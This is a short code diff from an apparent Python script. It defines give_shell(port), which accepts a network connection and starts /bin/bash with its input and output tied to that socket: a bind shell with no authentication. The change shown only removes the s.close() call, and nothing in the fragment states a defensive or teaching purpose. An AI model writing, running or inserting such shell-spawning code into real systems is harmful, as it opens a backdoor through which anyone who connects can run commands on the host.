@@ -27,7 +27,6 @@ def give_shell(port):
     (rem, addr) = s.accept()
     child = subprocess.Popen(["/bin/bash"], stdout=rem.fileno(),
                             stderr=rem.fileno(), stdin=rem.fileno())
-    s.close()
 
 
 if __name__ == "__main__":
